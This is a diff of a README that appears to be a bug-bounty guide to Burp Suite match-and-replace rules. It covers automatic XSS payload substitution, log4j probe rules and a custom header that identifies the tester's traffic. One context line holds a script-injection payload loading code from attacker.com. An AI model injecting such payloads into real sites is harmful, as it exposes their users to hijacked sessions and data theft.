@@ -82,6 +82,7 @@ By adding some XSS payload into the request
 <img src="https://user-images.githubusercontent.com/36522826/166752610-9d21d86e-49e5-4e8f-86bc-a9134350d46d.png" width="400" />
 
 > So by just inputting the words `xss_payload` on the website it will be immediately replaced with `"><script src=https://attacker.com></script>`
+> Change the XSS payload as you want
 
 ## MISC
 Some random match and replace rules
@@ -90,3 +91,17 @@ Some random match and replace rules
 <img src="https://user-images.githubusercontent.com/36522826/166748175-6782ce51-b10f-4b1d-b8a3-610ef142d567.png" width="400" />
 
 > Create some another rules to look for them in headers, parameters and more. Because log4j can be found anywhere
+
+* Help companies to identify your traffic and separate them from malicious traffic by adding a custom header
+
+<img src="https://user-images.githubusercontent.com/36522826/166796789-e184716f-00a3-428d-9323-bcd985556798.png" width="400" />
+
+References:
+- https://twitter.com/PTestical/status/1413497660133318659
+- https://twitter.com/HolyBugx/status/1355472991061213184
+- https://twitter.com/intigriti/status/1192103070072741894
+- https://twitter.com/payloadartist/status/1469582893772984322
+- https://twitter.com/payloadartist/status/1422247377516122114
+- https://twitter.com/hackerscrolls/status/1247177578269597698
+
+> Soon will be updated again
